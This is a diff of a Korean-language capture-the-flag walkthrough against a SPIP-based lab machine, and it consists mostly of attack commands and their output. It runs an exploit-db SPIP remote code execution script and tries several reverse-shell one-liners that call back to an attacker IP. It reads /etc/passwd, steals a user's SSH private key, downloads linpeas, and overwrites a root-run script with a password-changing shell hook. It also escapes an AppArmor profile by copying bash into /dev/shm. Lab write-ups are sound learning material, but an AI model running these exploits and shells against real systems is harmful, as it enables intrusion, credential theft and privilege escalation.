@@ -1,11 +1,11 @@
-# 10.201.11.134
+# 10.201.17.89
 
-nmap -Pn -sV -sC -oN nmap.txt --open 10.201.11.134
+nmap -Pn -sV -sC -oN nmap.txt --open 10.201.17.89
 
 ┌──(root㉿docker-desktop)-[/]
-└─# nmap -Pn -sV -sC -oN nmap.txt --open 10.201.11.134
+└─# nmap -Pn -sV -sC -oN nmap.txt --open 10.201.17.89
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 15:03 UTC
-Nmap scan report for 10.201.11.134
+Nmap scan report for 10.201.17.89
 Host is up (0.34s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT STATE SERVICE VERSION
@@ -19,10 +19,10 @@ PORT STATE SERVICE VERSION
 |\_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-ffuf -u http://10.201.11.134 -H "Host:FUZZ.10.201.11.134" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 50 -mc 200,302
+ffuf -u http://10.201.17.89 -H "Host:FUZZ.10.201.17.89" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 50 -mc 200,302
 
 ┌──(root㉿docker-desktop)-[/]
-└─# ffuf -u http://10.201.11.134 -H "Host:FUZZ.10.201.11.134" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178
+└─# ffuf -u http://10.201.17.89 -H "Host:FUZZ.10.201.17.89" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -36,9 +36,9 @@ ffuf -u http://10.201.11.134 -H "Host:FUZZ.10.201.11.134" -w /usr/share/seclists
 ---
 
 :: Method : GET
-:: URL : http://10.201.11.134
+:: URL : http://10.201.17.89
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
-:: Header : Host: FUZZ.10.201.11.134
+:: Header : Host: FUZZ.10.201.17.89
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
@@ -60,9 +60,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/c9aee363-a145-4492-a058-9d1eabd973c6/image.png)
 
-ffuf -u "http://10.201.11.134/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
+ffuf -u "http://10.201.17.89/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
 ┌──(root㉿docker-desktop)-[/]
-└─# ffuf -u "http://10.201.11.134/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt
+└─# ffuf -u "http://10.201.17.89/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -76,7 +76,7 @@ ffuf -u "http://10.201.11.134/FUZZ" -w /usr/share/seclists/Discovery/Web-Content
 ---
 
 :: Method : GET
-:: URL : http://10.201.11.134/FUZZ
+:: URL : http://10.201.17.89/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration : false
@@ -98,7 +98,7 @@ images, server-status, spip
 ![](https://velog.velcdn.com/images/agnusdei1207/post/4b46f70a-95d5-4c12-8b5a-47b174ffecf3/image.png)
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/af9a94e6-090f-4696-9601-444fa18824f8/image.png)
-http://10.201.11.134/spip/spip.php?page=login&url=spip.php%3Fpage%3Dplan&lang=fr
+http://10.201.17.89/spip/spip.php?page=login&url=spip.php%3Fpage%3Dplan&lang=fr
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/c85edd3d-63d7-4a14-8bc1-cc659a4e2aea/image.png)
 
@@ -111,7 +111,7 @@ https://github.com/PaulSec/SPIPScan?source=post_page-----a256af21d7bd-----------
 > searchsploiot -u
 > searchsploit spip
 
-# 10.201.11.134
+# 10.201.17.89
 
 ┌──(root㉿docker-desktop)-[/]
 └─# searchsploit spip
@@ -253,11 +253,11 @@ if __name__ == '__main__':
 ```
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id"
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89 -c "id"
 python3: can't open file '/usr/share/exploitdb/exploits/php/webapps/51536': [Errno 2] No such file or directory
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id"
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89 -c "id"
 Traceback (most recent call last):
 File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 63, in <module>
 requests.packages.urllib3.util.ssl*.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
@@ -270,7 +270,7 @@ AttributeError: module 'urllib3.util.ssl*' has no attribute 'DEFAULT_CIPHERS'
 └─# vim /usr/share/exploitdb/exploits/php/webapps/51536.py
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id"
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89 -c "id"
 File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 66
 except AttributeError:
 ^^^^^^
@@ -279,23 +279,23 @@ IndentationError: expected an indented block after 'try' statement on line 64
 # 왜 못 찾지?
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id"
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89 -c "id"
 [-] Unable to find Anti-CSRF token
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134 -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89 -c "id" --verbose
 [-] Unable to find Anti-CSRF token
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
 # 직접 input 확인하자 -> 대상에 input 태그가 없네? -> 다른 페이지 찾기 -> 취약점 다시 보기 -> spip.php?page=login
 
 ──(root㉿docker-desktop)-[/]
-└─# http http://10.201.11.134
+└─# http http://10.201.17.89
 
 # 탐색 -> 안 나옴
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http http://10.201.11.134/spip.php
+└─# http http://10.201.17.89/spip.php
 HTTP/1.1 404 Not Found
 Connection: Keep-Alive
 Content-Length: 274
@@ -309,12 +309,12 @@ Server: Apache/2.4.41 (Ubuntu)
 ![](https://velog.velcdn.com/images/agnusdei1207/post/a9d0fb96-6adf-4e4e-91bb-cf0ea2ae1ad0/image.png)
 
 ──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip -c "id" --verbose
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http http://10.201.11.134/spip.php?page=spip_pass
+└─# http http://10.201.17.89/spip.php?page=spip_pass
 HTTP/1.1 404 Not Found
 Connection: Keep-Alive
 Content-Length: 274
@@ -330,12 +330,12 @@ Server: Apache/2.4.41 (Ubuntu)
 <h1>Not Found</h1>
 <p>The requested URL was not found on this server.</p>
 <hr>
-<address>Apache/2.4.41 (Ubuntu) Server at 10.201.11.134 Port 80</address>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.201.17.89 Port 80</address>
 </body></html>
 
 # i found it -> spip -> 한 번 더 써야함!
 
-> http http://10.201.11.134/spip/spip.php?page=spip_pass
+> http http://10.201.17.89/spip/spip.php?page=spip_pass
 
 # input 에 oubli CSRF 토큰이 hidden 처리되어 있음
 
@@ -346,14 +346,14 @@ Server: Apache/2.4.41 (Ubuntu)
 # not found token
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php?page=spip_pass -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php?page=spip_pass -c "id" --verbose
 [-] Unable to find Anti-CSRF token
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
 # without queryparam try!
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "id" --verbose
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
@@ -376,7 +376,7 @@ def send_payload(url, payload):
 ```
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "id" --verbose
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "id" --verbose
 [+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
 [+] Execute this payload : s:22:"<?php system('id'); ?>";
 
@@ -393,14 +393,14 @@ def send_payload(url, payload):
 
 # RS
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose
 
 - bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
 - rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f
 - nc -lvnp 1234
 
 ┌──(root㉿docker-desktop)-[/]
-└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose | grep input
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose | grep input
 <span class="form-hidden"><input name="page" value="spip_pass" type="hidden"
 /><input name='formulaire_action' type='hidden'
                 value='oubli' /><input name='formulaire_action_args' type='hidden'
@@ -426,29 +426,29 @@ bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
 "php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
 ```
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/1234 0>&1" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/1234 0>&1" --verbose
 
 # 작은따옴표로 문자열을 감싸서 명령 주입 오류를 피합니다.
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "php -r '$sock=fsockopen(\"10.8.136.212\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "php -r '$sock=fsockopen(\"10.8.136.212\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" --verbose
 
 # RH ping test -> failed
 
 tcpdump -i tun0 icmp
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ping -c 1 10.8.136.212" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ping -c 1 10.8.136.212" --verbose
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls" --verbose
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "pwd" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "pwd" --verbose
 
 /home/think/spip/spip
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls /home" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls /home" --verbose
 think
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls /home/think" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls /home/think" --verbose
 spip
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls -al /home/think/spip" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls -al /home/think/spip" --verbose
 
 drwxr-xr-x 11 www-data www-data 4096 Feb 12 2024 .
 drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 ..
@@ -474,7 +474,7 @@ drwxr-xr-x 10 www-data www-data 4096 Dec 20 2023 squelettes-dist
 drwxr-xr-x 6 www-data www-data 4096 Nov 9 04:37 tmp
 drwxr-xr-x 6 www-data www-data 4096 Dec 20 2023 vendor
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "cat /etc/passwd" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /etc/passwd" --verbose
 
 # think 1000번인걸로 보아 일반 사용자 계정으로 판단 -> 일반적으로 1000부터 시작함 일반 게스트는, 0-> root 관리자
 
@@ -498,13 +498,13 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 \_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 think:x:1000:1000::/home/think:/bin/sh
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "id" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "id" --verbose
 
 # 현재 www-data 계정
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls -al /" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls -al /" --verbose
 
 drwxr-xr-x 1 root root 4096 Dec 20 2023 .
 drwxr-xr-x 1 root root 4096 Dec 20 2023 ..
@@ -552,13 +552,13 @@ drwxr-xr-x 3 root root 4096 Dec 7 2023 www
 
 python3 -m http.server 8000
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/8000 0>&1" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/8000 0>&1" --verbose
 
 # 탐색
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls -al /home/think" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls -al /home/think" --verbose
 
 drwxr-xr-x 8 think think 4096 Feb 10 2024 .
 drwxr-xr-x 1 root root 4096 Dec 7 2023 ..
@@ -578,15 +578,15 @@ drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 spip
 
 # flag 1
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "cat /home/think/user.txt" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /home/think/user.txt" --verbose
 fa229046d44eda6a3598c73ad96f4ca5
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "ls -al /home/think/.ssh" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "ls -al /home/think/.ssh" --verbose
 
 -rw-r--r-- 1 root root 569 Jan 10 2024 authorized_keys
 -rw-r--r-- 1 think think 2602 Jan 10 2024 id_rsa
 -rw-r--r-- 1 think think 569 Jan 10 2024 id_rsa.pub
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "cat /home/think/.ssh/id_rsa" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /home/think/.ssh/id_rsa" --verbose
 
 # RSA 탈취
 
@@ -634,21 +634,21 @@ Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
 # 비밀번호 계속 요구함 -> pem 있는데 요구하도록 설정이 된건가?
 
 ┌──(root㉿docker-desktop)-[/]
-└─# sudo ssh -i think.pem think@10.201.11.134
+└─# sudo ssh -i think.pem think@10.201.17.89
 
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 \*\* The server may need to be upgraded. See https://openssh.com/pq.html
 Load key "think.pem": error in libcrypto
-think@10.201.11.134's password:
+think@10.201.17.89's password:
 
-python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.11.134/spip/spip.php -c "cat /home/think/.ssh/authorized_keys" --verbose
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.17.89/spip/spip.php -c "cat /home/think/.ssh/authorized_keys" --verbose
 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDE+9z2mKOlQkDiiXK+RbSvJgBIGl2YFqw4SWzo5HDsUyCM9bzq0Mq4hfJmd4EhRqsmJmHxXMWqYpFhyKgPCUnOr73/aKlAdNXM2PHGDXzBa8XRacraUjlNDtBdw5jz7UJRVfrvLhResoBJ/yXuU8ogQPbhteOQMGRWsIwfBJxBuD+cggXHKLbrYmglOOH0mDFIGNoM4QsEHHJ2/vxgw313Jp8iYBdhf3ofmT7y8Lz8jduTCIKeG4oonXVNXhvyUyxuuCpthFh9sIlqkHbvMnbhrVpHlSf4RzZdXZ9rCGZ+1LTlvXQzRACcMS7tIZcb2YX+EsnKF5F7yW/6uTkSRk2CHXhilcb8T3IhvEH1F/mTR6TGh1mNVXTqKogcGiZxCsqi1XmdcFE+BV4fvUmBVAWQ1DKpUzjB/qg4NKpCy4i+eQHmX17T3mwkPDPWmP9pMvdnpnbwqA8oKM4Qu+QA9ydy4xBO77PpBVSvRwKOBJGHDgbL9t8niUvJf9tyIvlCjJ0= think@publisher
 
 # think.pem -> id_rsa 로 파일명 변경 후 재시도 -> 성공 -> 파일 이름이 .pem 이면 다른 방식으로 시도함 -> id_rsa 방식이면 그에 맞게 파일명도 변경하는 것이 적절
 
-sudo ssh -i id_rsa think@10.201.11.134
+sudo ssh -i id_rsa think@10.201.17.89
 
 # flag 1
 
@@ -947,7 +947,7 @@ disk
 ╔══════════╣ Environment
 ╚ Any private information inside environment variables?
 
-sudo ssh -i id_rsa think@10.201.11.134
+sudo ssh -i id_rsa think@10.201.17.89
 wget http://10.8.136.212/tmp/linpeas.sh
 ./linpeas.sh
 
@@ -1965,7 +1965,7 @@ QT_ACCESSIBILITY=1
 SHELL=/usr/sbin/ash
 SHLVL=1
 SSH_CLIENT=10.8.136.212 60936 22
-SSH_CONNECTION=10.8.136.212 60936 10.201.11.134 22
+SSH_CONNECTION=10.8.136.212 60936 10.201.17.89 22
 SSH_TTY=/dev/pts/0
 TERM=xterm
 USER=think
@@ -2630,4 +2630,130 @@ think@ip-10-201-11-134:/dev/shm$ ls -l /opt/run_container.sh
 -rwxrwxrwx 1 root root 1715 Jan 10 2024 /opt/run_container.sh
 think@ip-10-201-11-134:/dev/shm$
 
-sudo ssh -i id_rsa think@10.201.11.134
+# 상위 opt 디렉토리에는 쓰기 권한이 없으므로 안 됨
+
+drwxr-xr-x 3 root root 4096 Jan 10 2024 opt
+
+ssh -i id_rsa think@10.201.17.89
+
+# tee 은 바로 가능하므로 진행 -> 덮어쓰기 -> 안 됨 -> 보안 서비스가 작동중인 것으로 의심
+
+echo 'get_root_shell(){ /bin/bash; echo "think:1234" | chpasswd; }; get_root_shell' > /opt/run_container.sh
+
+echo 'get_root_shell(){ /bin/bash; echo "think:1234" | chpasswd; }; get_root_shell' | tee /opt/run_container.sh
+
+# apparmor 보안 모듈 작동중
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/d8351849-ee0a-49f2-8ab3-1d7e068384f5/image.png)
+
+# 설정 정보 /etc/apparmor.d/ 확인
+
+think@ip-10-201-17-89:/dev/shm$ ls -al /etc/apparmor.d/
+total 96
+drwxr-xr-x 8 root root 4096 Apr 27 2025 .
+drwxr-xr-x 132 root root 12288 Nov 9 12:09 ..
+drwxr-xr-x 2 root root 4096 Apr 27 2025 abi
+drwxr-xr-x 4 root root 12288 Apr 27 2025 abstractions
+drwxr-xr-x 2 root root 4096 Feb 23 2022 disable
+drwxr-xr-x 2 root root 4096 Feb 11 2020 force-complain
+drwxr-xr-x 2 root root 4096 Apr 27 2025 local
+-rw-r--r-- 1 root root 1313 May 19 2020 lsb_release
+-rw-r--r-- 1 root root 1108 May 19 2020 nvidia_modprobe
+-rw-r--r-- 1 root root 3500 Jan 31 2023 sbin.dhclient
+drwxr-xr-x 5 root root 4096 Apr 27 2025 tunables
+-rw-r--r-- 1 root root 1724 Sep 6 2024 ubuntu_pro_apt_news
+-rw-r--r-- 1 root root 6853 Sep 6 2024 ubuntu_pro_esm_cache
+-rw-r--r-- 1 root root 3202 Feb 25 2020 usr.bin.man
+-rw-r--r-- 1 root root 532 Feb 12 2024 usr.sbin.ash
+-rw-r--r-- 1 root root 672 Feb 19 2020 usr.sbin.ippusbxd
+-rw-r--r-- 1 root root 2006 Jun 14 2023 usr.sbin.mysqld
+-rw-r--r-- 1 root root 1575 Feb 11 2020 usr.sbin.rsyslogd
+-rw-r--r-- 1 root root 1674 Feb 8 2024 usr.sbin.tcpdump
+
+# /etc/apparmor.d$ ls -> 내부 명령어들 존재
+
+think@ip-10-201-17-89:/etc/apparmor.d$ ls
+abi force-complain nvidia_modprobe ubuntu_pro_apt_news usr.sbin.ash usr.sbin.rsyslogd
+abstractions local sbin.dhclient ubuntu_pro_esm_cache usr.sbin.ippusbxd usr.sbin.tcpdump
+disable lsb_release tunables usr.bin.man usr.sbin.mysqld
+think@ip-10-201-17-89:/etc/apparmor.d$
+
+Here out profile is “usr.sbin.ash” and you can know this by useing this command to know your shell name
+
+# 현재 내 쉘 확인 -> ash
+
+think@ip-10-201-17-89:/etc/apparmor.d$ ps -p $$
+PID TTY TIME CMD
+1376 pts/0 00:00:00 ash
+
+# 그럼 ash 만 수정하기
+
+think@ip-10-201-17-89:/etc/apparmor.d$ cat usr.sbin.ash
+#include <tunables/global>
+
+/usr/sbin/ash flags=(complain) {
+#include <abstractions/base>
+#include <abstractions/bash>
+#include <abstractions/consoles>
+#include <abstractions/nameservice>
+#include <abstractions/user-tmp>
+
+# Remove specific file path rules
+
+# Deny access to certain directories
+
+deny /opt/ r,
+deny /opt/** w,
+deny /tmp/** w,
+deny /dev/shm w,
+deny /var/tmp w,
+deny /home/** w,
+/usr/bin/** mrix,
+/usr/sbin/\*\* mrix,
+
+# Simplified rule for accessing /home directory
+
+owner /home/\*\* rix,
+}
+
+# 수정 불가! 권한 부족
+
+# bash 쉘은 현재 앱아머 룰 아래에 있지 않음
+
+think@ip-10-201-17-89:/etc/apparmor.d$ ls
+abi force-complain nvidia_modprobe ubuntu_pro_apt_news usr.sbin.ash usr.sbin.rsyslogd
+abstractions local sbin.dhclient ubuntu_pro_esm_cache usr.sbin.ippusbxd usr.sbin.tcpdump
+disable lsb_release tunables usr.bin.man usr.sbin.mysqld
+
+> 목표: AppArmor와 같은 보안 규칙의 통제를 받지 않는 Bash 셸을 획득하는 것입니다.
+> 문제: 일반적인 bash 명령어를 실행하면 시스템의 기본 경로인 /usr/bin/bash가 호출되는데, 이 경로는 AppArmor의 감시와 제약을 받기 때문에 우회에 실패합니다.
+> 결론: 따라서, AppArmor의 통제를 받지 않는 경로에 존재하는 다른 Bash 바이너리나, Bash 셸을 실행할 수 있는 다른 방법을 찾아야 합니다.
+
+think@ip-10-201-17-89:/etc/apparmor.d$ which bash
+/usr/bin/bash
+
+# cp ? in /dev/shm
+
+think@ip-10-201-17-89:/dev/shm$ cp /bin/bash .
+think@ip-10-201-17-89:/dev/shm$ ls -l
+total 2296
+-rwxr-xr-x 1 think think 1183448 Nov 9 12:49 bash
+-rwxrwxrwx 1 think think 971926 Nov 1 04:39 linpeas.sh
+-rw-rw-r-- 1 think think 188906 Nov 9 12:22 result.txt
+
+# ash -> bash 이제부터 /opt/container.sh 수정 가능하겠네..!?
+
+think@ip-10-201-17-89:/dev/shm$ ps -p $$
+PID TTY TIME CMD
+31067 pts/0 00:00:00 bash
+
+```bash
+# 다시 실행하자
+get_root_shell() {
+    /bin/bash
+    # 비밀번호도 새로 설정
+    echo "think:1234" | chpasswd
+}
+
+get_root_shell
+```
